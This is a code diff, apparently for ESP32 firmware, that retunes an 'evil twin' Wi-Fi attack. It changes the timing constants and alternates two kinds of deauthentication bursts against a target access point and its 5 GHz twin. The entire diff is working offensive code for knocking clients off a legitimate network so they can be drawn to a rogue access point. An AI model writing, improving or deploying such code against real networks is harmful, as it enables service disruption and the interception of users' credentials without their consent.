@@ -11,9 +11,9 @@
 
 
 #define EVIL_TWIN_TASK_PRIO 5
-#define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
-#define ATTACK_WINDOW        50  // RCO duration
-#define SOFTAP_REST_TIME     150   // Home channel time
+#define CHANNEL_SWITCH_DELAY 15   // Channel switch assestment time
+#define ATTACK_WINDOW        75  // RCO duration
+#define SOFTAP_REST_TIME     300   // Home channel time
 
 /* Store target information */
 static const char *TAG = "EVIL_TWIN";
@@ -95,8 +95,12 @@ static void evil_twin_task(void *pvParameters)
     
     while(true)
     {
-        for(uint8_t burst = 0; burst < 8; burst++) {
+        for(uint8_t burst = 0; burst < 4; burst++) {
             wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
+            vTaskDelay(pdMS_TO_TICKS(5));
+        }
+        for(uint8_t burst = 0; burst < 4; burst++) {
+            wifi_attack_deauth_basic(NULL, target->bssid, 7);
             vTaskDelay(pdMS_TO_TICKS(5));
         }
 
@@ -105,8 +109,12 @@ static void evil_twin_task(void *pvParameters)
             if(wifi_set_temporary_channel(twin_on_5ghz.channel, ATTACK_WINDOW) == ESP_OK) {
                 vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
                 /* Send Burst */
-                for(uint8_t burst = 0; burst < 8; burst++) {
+                for(uint8_t burst = 0; burst < 4; burst++) {
                     wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, twin_on_5ghz.channel, (char *)twin_on_5ghz.ssid);
+                    vTaskDelay(pdMS_TO_TICKS(5));
+                }
+                for(uint8_t burst = 0; burst < 4; burst++) {
+                    wifi_attack_deauth_basic(NULL, twin_on_5ghz.bssid, 7);
                     vTaskDelay(pdMS_TO_TICKS(5));
                 }
             }
